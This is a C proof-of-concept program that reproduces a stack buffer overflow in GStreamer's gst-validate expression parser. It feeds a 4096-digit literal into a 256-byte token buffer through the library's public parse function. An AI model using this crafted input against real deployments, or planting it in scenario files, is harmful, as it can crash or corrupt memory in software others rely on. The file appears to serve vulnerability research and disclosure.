/*
 * Standalone repro for candidate 025: stack buffer overflow in
 * gst_validate_utils_read_token / _read_double() / _read_builtin() inside
 * subprojects/gst-devtools/validate/gst/validate/gst-validate-utils.c.
 *
 * Calls the REAL, unmodified public entry point
 * gst_validate_utils_parse_expression() from the actual built
 * libgstvalidate-1.0.so, with a crafted expression string as its only
 * input - exactly the shape of input a scenario file's `expr(...)` field
 * would resolve to (see gst-validate-utils.c around line 1354, where
 * gst_validate_replace_variables_in_string() calls this same function on
 * scenario-provided text). No second participant/peer is involved: the
 * expression string is the whole external input, same as a malformed file
 * handed to a parser's own public entry point.
 */

#include <gst/gst.h>
#include <gst/validate/gst-validate-utils.h>
#include <stdio.h>
#include <string.h>

static int
no_variables (const gchar * name, gdouble * value, gpointer user_data)
{
  (void) name;
  (void) value;
  (void) user_data;
  return 0;
}

int
main (int argc, char **argv)
{
  gst_init (&argc, &argv);

  /* One digit short of PARSER_MAX_TOKEN_SIZE (256) would still fit; go well
   * past it so the overflow is unmistakable regardless of exact off-by-one
   * boundary. */
  const int n_digits = 4096;
  gchar *expr = g_malloc (n_digits + 1);
  memset (expr, '1', n_digits);
  expr[n_digits] = '\0';

  fprintf (stderr, "Calling gst_validate_utils_parse_expression() with a "
      "%d-digit numeric literal (token buffer is only 256 bytes)...\n",
      n_digits);

  gchar *error = NULL;
  gdouble val = gst_validate_utils_parse_expression (expr, no_variables, NULL,
      &error);

  /* Only reached if it somehow didn't crash - report so the caller can see
   * clearly this run did NOT trigger a crash. */
  fprintf (stderr, "Returned without crashing: val=%f error=%s\n", val,
      error ? error : "(none)");

  g_free (error);
  g_free (expr);
  return 0;
}
